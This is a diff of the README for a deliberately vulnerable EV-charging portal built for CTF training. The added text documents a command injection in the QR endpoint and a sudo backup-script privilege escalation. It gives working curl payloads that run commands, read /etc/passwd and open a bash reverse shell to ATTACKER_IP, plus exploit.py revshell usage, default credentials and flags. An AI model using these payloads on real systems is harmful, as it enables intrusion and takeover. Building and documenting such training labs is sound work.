@@ -2,157 +2,180 @@
 
 ## Overview
 
-This is a deliberately vulnerable web application simulating a regional EV charging network operator's portal. It is designed for cybersecurity training and CTF (Capture The Flag) competitions.
+EcoCharge Portal is an intentionally vulnerable web application simulating a regional EV charging network operator's website. This application is designed for cybersecurity training and CTF (Capture The Flag) competitions.
 
-**⚠️ WARNING: This application contains intentional security vulnerabilities. DO NOT deploy in production environments!**
+**⚠️ WARNING: This application contains intentional security vulnerabilities. Do NOT deploy in production environments!**
 
-## Quick Start
+## Technology Stack
 
+- **Framework**: Next.js 14.2.5
+- **Frontend**: React 18.3.1, Tailwind CSS
+- **Runtime**: Node.js 18+
+- **Database**: SQLite (for caching)
+
+## Vulnerabilities
+
+### 1. CWE-78: Command Injection (PRIMARY)
+
+**Location**: `/app/api/qr/route.js`  
+**Endpoint**: `GET /api/qr`  
+**Parameter**: `station`
+
+The QR code generator endpoint passes the `station` parameter directly to a shell command without sanitization.
+
+**Discovery Path**:
+1. Browse to any station page (e.g., `/stations/EV-CH-001`)
+2. Click the QR code button
+3. Observe the API call in DevTools: `/api/qr?station=EV-CH-001&format=png`
+4. Try invalid format: `/api/qr?station=EV-CH-001&format=pdf`
+5. Debug response reveals command structure
+6. Inject commands via station parameter
+
+**Exploitation**:
 ```bash
-# Clone repository
-git clone https://github.com/lota-ll/ecocharge-website.git
-cd ecocharge-website
+# Check vulnerability (debug info disclosure)
+curl "http://target:3000/api/qr?station=EV-CH-001&format=pdf"
 
-# Install dependencies
-npm install --legacy-peer-deps
+# Command injection
+curl "http://target:3000/api/qr?station=EV-CH-001;id&format=png"
 
-# Build
-npm run build
+# Read files
+curl "http://target:3000/api/qr?station=EV-CH-001;cat+/etc/passwd&format=png"
 
-# Start
-npm start
+# Reverse shell
+curl "http://target:3000/api/qr?station=EV-CH-001;bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'&format=png"
 ```
 
-Application will be available at `http://localhost:3000`
+### 2. CWE-78: Command Injection (Privilege Escalation)
 
-## Deployment on Server
+**Location**: `/scripts/backup.js`  
+**Trigger**: sudo execution by www-data user
 
+After gaining initial access, attacker can escalate privileges via the backup script.
+
+**Exploitation**:
 ```bash
-# Run automated setup (requires root)
-chmod +x setup-server.sh
-sudo ./setup-server.sh
+# Check sudo permissions
+sudo -l
+
+# Privilege escalation
+export BACKUP_TARGET="; /bin/bash -p"
+sudo /usr/bin/node /opt/maintenance/backup.js
 ```
 
-The setup script will:
-- Install Node.js and dependencies
-- Configure nginx as reverse proxy
-- Create systemd service
-- Set up CTF flags
-- Configure privilege escalation vulnerability
+### 3. Information Disclosure
 
-## Vulnerabilities Included
+**Location**: `.env` file, API responses  
+**Type**: Credential and configuration leak
 
-| Vulnerability | Location | Severity | CVSS |
-|--------------|----------|----------|------|
-| React Server Components RCE | `/api/server-action` | Critical | 9.8 |
-| Command Injection (PrivEsc) | `/opt/maintenance/backup.js` | High | 7.8 |
-| IDOR | `/api/user?user_id=X` | Medium | 6.5 |
-| Weak Authentication (MD5) | `/api/auth` | Medium | 5.3 |
-| Information Disclosure | HTTP headers, errors | Low | 3.7 |
-
-## Default Credentials
-
-| Role | Email | Password |
-|------|-------|----------|
-| Admin | admin@ecocharge.local | EcoCharge2024! |
-| Operator | operator@ecocharge.local | Operator123! |
-| User | user@ecocharge.local | 12345678 |
-
-## Project Structure
-
-```
-ecocharge-website/
-├── app/
-│   ├── api/
-│   │   ├── auth/           # Authentication endpoints
-│   │   ├── server-action/  # Vulnerable RCE endpoint
-│   │   ├── stations/       # Stations API
-│   │   └── user/           # User API (IDOR)
-│   ├── admin/              # Admin panel
-│   │   ├── layout.js       # Admin layout
-│   │   ├── page.js         # Dashboard
-│   │   ├── stations/       # Stations management
-│   │   ├── users/          # Users management
-│   │   ├── transactions/   # Transactions history
-│   │   └── settings/       # System settings
-│   ├── auth/               # Login/Register pages
-│   ├── dashboard/          # User dashboard
-│   ├── stations/           # Public stations list
-│   ├── about/              # About page
-│   ├── prices/             # Pricing page
-│   ├── layout.js           # Main layout
-│   ├── page.js             # Homepage
-│   └── globals.css         # Styles
-├── scripts/
-│   └── backup.js           # Vulnerable backup script
-├── .env                    # Configuration (contains secrets)
-├── exploit.py              # CVE-2025-55182 exploit PoC
-├── setup-server.sh         # Deployment script
-├── package.json
-├── next.config.js
-└── README.md
-```
+The `.env` file contains:
+- API Gateway credentials
+- Internal service URLs
+- JWT secrets
+- CTF flags
 
 ## CTF Flags
 
-| # | Location | Description |
-|---|----------|-------------|
-| 1 | `/var/www/ecocharge/.flag1.txt` | Initial access (www-data) |
-| 2 | `/root/.flag2.txt` | Privilege escalation (root) |
-| 3 | `.env` file | Credential leak |
+| # | Flag | Location | Method |
+|---|------|----------|--------|
+| 1 | `FLAG{w3b_rCE_qr_1nj3ct10n}` | `/var/www/FLAG_1.txt` | Command Injection RCE |
+| 2 | `FLAG{pr1v3sc_b4ckup_sh3ll}` | `/root/FLAG_2.txt` | Privilege Escalation |
+| 3 | `FLAG{cr3d3nt14ls_1n_c0nf1g_f1l3s}` | `.env` file | Credential Discovery |
 
 ## API Endpoints
 
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/api/stations` | GET | List all charging stations |
-| `/api/stations` | POST | Get station by ID |
-| `/api/auth` | POST | User authentication |
-| `/api/auth` | GET | Verify token |
-| `/api/auth/register` | POST | User registration |
-| `/api/user` | GET | Get user data (IDOR vulnerable) |
-| `/api/server-action` | POST | **VULNERABLE** - RCE endpoint |
+| Endpoint | Method | Description | Vulnerable |
+|----------|--------|-------------|------------|
+| `/api/qr` | GET | QR code generator | ✅ Command Injection |
+| `/api/qr` | POST | Batch QR generation | ✅ Command Injection |
+| `/api/stations` | GET | List stations | Info Disclosure |
+| `/api/stations` | POST | Get station by ID | - |
+| `/api/auth` | POST | User authentication | - |
+| `/api/user` | GET | Get user data | IDOR |
+
+## Installation
+
+### Prerequisites
+- Node.js 18+
+- npm or yarn
+- qrencode (for QR generation): `apt install qrencode`
+
+### Setup
+```bash
+# Clone repository
+git clone https://github.com/your-org/ecocharge-website.git
+cd ecocharge-website
+
+# Install dependencies
+npm install
+
+# Development mode
+npm run dev
+
+# Production build
+npm run build
+npm start
+```
+
+### Docker
+```bash
+docker build -t ecocharge-portal .
+docker run -p 3000:3000 ecocharge-portal
+```
 
 ## Network Configuration
 
 | Parameter | Value |
 |-----------|-------|
-| IP Address | 192.168.125.50 |
-| Hostname | ecocharge-web |
-| Network | External (192.168.125.0/24) |
+| Default Port | 3000 |
+| Recommended IP | 192.168.250.50 |
+| Network Zone | Frontend Zone |
 
-## Testing Vulnerabilities
+## Directory Structure
 
-### Test RCE (CVE-2025-55182)
-
-```bash
-python3 exploit.py https://ecocharge.local check
-python3 exploit.py https://ecocharge.local exec 'id'
-python3 exploit.py https://ecocharge.local revshell 192.168.125.228 4444
+```
+ecocharge-website/
+├── app/
+│   ├── api/
+│   │   ├── qr/              # VULNERABLE - Command Injection
+│   │   │   └── route.js
+│   │   ├── stations/
+│   │   ├── auth/
+│   │   └── user/
+│   ├── stations/
+│   │   ├── page.js
+│   │   └── [id]/
+│   │       └── page.js      # QR code modal
+│   ├── admin/
+│   └── ...
+├── scripts/
+│   └── backup.js            # VULNERABLE - PrivEsc
+├── exploit.py               # Exploitation script
+├── .env                     # Sensitive configuration
+└── README.md
 ```
 
-### Test IDOR
+## Exploit Script Usage
 
 ```bash
-curl https://ecocharge.local/api/user?user_id=1 -k
-curl https://ecocharge.local/api/user?user_id=2 -k
+# Check if target is vulnerable
+python3 exploit.py http://192.168.250.50:3000 check
+
+# Execute command
+python3 exploit.py http://192.168.250.50:3000 exec 'id'
+python3 exploit.py http://192.168.250.50:3000 exec 'cat /etc/passwd'
+
+# Get reverse shell
+python3 exploit.py http://192.168.250.50:3000 revshell 192.168.125.100 4444
 ```
 
-### Test Privilege Escalation
+## Defensive Recommendations
 
-```bash
-# After getting shell as www-data
-sudo -l
-export BACKUP_TARGET="; id"
-sudo /usr/bin/node /opt/maintenance/backup.js
-```
-
-## Technologies
-
-- **Framework**: Next.js 14.2.5
-- **Frontend**: React 18.3.1, Tailwind CSS
-- **Database**: SQLite (simulated)
-- **Web Server**: nginx 1.24
+1. **Input Validation**: Sanitize all user inputs before use in shell commands
+2. **Parameterized Commands**: Use parameterized execution instead of string concatenation
+3. **Least Privilege**: Remove unnecessary sudo permissions
+4. **Environment Security**: Never store secrets in `.env` files on web servers
+5. **Error Handling**: Don't expose debug information in production
 
 ## Security Notice
 
@@ -163,10 +186,20 @@ This application is intentionally vulnerable and should only be used in:
 
 **Never expose this application to the internet or use in production.**
 
+## Related Scenario Components
+
+This web server is part of the EcoCharge CTF scenario:
+- **API Gateway**: 192.168.100.20 (DMZ)
+- **Grafana**: 192.168.100.30 (DMZ)
+- **Jump Host**: 192.168.100.40 (DMZ)
+- **CSMS**: 192.168.20.20 (Internal)
+
 ## License
 
 Educational use only. Created for cybersecurity training purposes.
 
-## Author
+---
 
-Created for Master's Thesis: "Development of a scenario for integrating vulnerability data of EV charging station management system administrative panels into an experimental security analysis environment"
+**Version**: 1.1.0  
+**Last Updated**: February 2025  
+**Vulnerability**: CWE-78 Command Injection
